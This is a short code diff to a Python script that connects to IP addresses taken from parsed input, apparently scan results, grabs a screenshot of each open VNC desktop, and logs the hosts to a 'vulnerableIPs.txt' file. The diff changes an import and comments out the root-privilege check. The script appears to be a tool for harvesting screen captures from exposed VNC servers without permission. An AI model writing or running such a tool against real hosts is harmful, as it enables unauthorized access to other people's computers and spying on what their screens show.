@@ -1,6 +1,6 @@
 import os
 from subprocess import call
-import vncapi
+from vncapi import api
 import os.path
 import threading
 from filelock import FileLock
@@ -10,7 +10,7 @@ def parseLine(line):
 
     parsedLine = line.split(" ")
     try:
-        client = vncapi.api.connect("{ip}:0".format(ip=parsedLine[3]))
+        client = api.connect("{ip}:0".format(ip=parsedLine[3]))
         client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
         print('Got image from {ip}'.format(ip=parsedLine[3]))
         with FileLock("vulnerableIPs.txt"):
@@ -36,6 +36,6 @@ def main():
 
 
 if __name__ == '__main__':
-    if os.geteuid() != 0:
-        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
+    #if os.geteuid() != 0:
+        #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
     main()
